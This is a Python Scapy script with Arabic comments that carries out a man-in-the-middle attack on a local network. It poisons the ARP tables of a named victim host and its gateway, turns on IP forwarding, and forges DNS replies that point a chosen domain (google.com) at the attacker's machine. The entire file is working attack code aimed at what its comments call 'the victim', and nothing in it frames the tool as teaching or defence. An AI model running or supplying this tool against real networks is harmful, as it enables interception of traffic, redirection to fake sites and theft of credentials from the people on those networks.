import sys
import os
import time
from scapy.all import *
from threading import Thread
import socket, struct

# ============ إعداداتك ============
TARGET_IP   = "192.168.111.130"
GATEWAY_IP  = "192.168.111.1"       # ← بدّل إن كانت مختلفة عن `route -n`
ATTACKER_IP = "192.168.111.128"
IFACE       = "eth0"

# الدومين الذي تريد تزويره (اختر أي اسم يطلبه الضحية)
SPOOF_DOMAIN = "google.com"          # أي دومين يزوره الضحية
FAKE_IP      = ATTACKER_IP           # يعيد الضحية لجهازك
# ==================================


def get_mac(ip):
    """الحصول على MAC من IP"""
    ans, _ = arping(ip, verbose=0, timeout=2)
    return ans[0][1].hwsrc if ans else None

def arp_poison(target_ip, target_mac, source_ip):
    """تسميم ARP"""
    send(ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac), verbose=0)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    """إصلاح جدول ARP بعد الانتهاء"""
    send(ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac, hwsrc=source_mac), count=3, verbose=0)

def dns_spoof(pkt):
    """اعتراض واستجابة DNS مزيفة"""
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # استعلام
        qname = pkt[DNSQR].qname.decode(errors='ignore').rstrip('.')
        if SPOOF_DOMAIN in qname:
            print(f"[+] DNS Spoofed: {qname} -> {FAKE_IP}  (من {pkt[IP].src})")
            response = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                       UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP, ttl=10))
            send(response, verbose=0)

def main():
    print(f"[*] الحصول على MAC addresses...")
    target_mac = get_mac(TARGET_IP)
    gw_mac     = get_mac(GATEWAY_IP)
    
    if not target_mac or not gw_mac:
        print("[-] فشل في الحصول على MAC. تأكد أن الضحية والبوابة شغالين.")
        return
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gw_mac}")
    
    # تفعيل IP Forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # بدء تنصت DNS في خلفية
    print(f"[*] بدء DNS Spoofing لـ {SPOOF_DOMAIN} -> {FAKE_IP}")
    t = Thread(target=lambda: sniff(iface=IFACE, filter="udp port 53 and host 192.168.111.130",
                                     prn=dns_spoof, store=0), daemon=True)
    t.start()
    
    try:
        print(f"[*] بدء ARP Poisoning (اضغط Ctrl+C للإيقاف)...")
        while True:
            arp_poison(TARGET_IP, target_mac, GATEWAY_IP)  # الضحية ← نا
            arp_poison(GATEWAY_IP, gw_mac, TARGET_IP)      # البوابة ← نا
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] استعادة جداول ARP...")
        host_mac = get_mac(ATTACKER_IP)
        restore_arp(TARGET_IP, target_mac, GATEWAY_IP, gw_mac)
        restore_arp(GATEWAY_IP, gw_mac, TARGET_IP, host_mac)
        print("[+] تم الإصلاح. انتهى.")

if __name__ == "__main__":
    main()
